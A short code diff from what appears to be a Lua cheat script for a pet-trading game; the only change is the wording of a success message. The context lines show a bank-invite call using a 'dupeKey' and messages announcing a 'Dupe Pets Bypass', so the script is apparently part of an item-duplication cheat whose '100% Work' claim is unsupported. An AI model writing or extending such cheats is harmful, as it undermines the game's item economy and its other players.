@@ -81,7 +81,7 @@ if lib.Network.Invoke("Invite To Bank", mybanks[1]['BUID'], dupeKey) then
     wait(10)
     lib.Message.New("Dupe Pets Bypass Starting . . .");
     wait(5)
-    lib.Message.New("Congratulation , Your Pets is no Dupe 😍 \n Wait For 1 Hours+ before withdraw Your Pets \nFor the Bypass 100% Work 😊");
+    lib.Message.New("Congratulation , Your Pets is Clean Now 😍 \n Wait For 1 Hours+ before withdraw Your Pets \nFor the Bypass 100% Work 😊");
     end;
     
     end)
